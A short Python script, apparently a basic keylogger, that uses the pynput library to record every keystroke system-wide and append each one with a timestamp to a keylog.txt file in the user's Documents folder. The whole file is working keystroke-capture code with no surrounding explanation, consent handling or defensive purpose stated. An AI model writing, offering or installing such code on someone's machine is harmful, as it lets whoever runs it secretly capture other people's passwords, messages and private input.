from pynput import keyboard
import logging

# Set path to save log file
# log_file = "keylog.txt"
import os
log_file = os.path.expanduser("~\\Documents\\keylog.txt")

# Setup logging configuration
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key {key.char} pressed")
    except AttributeError:
        logging.info(f"Special key {key} pressed")

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
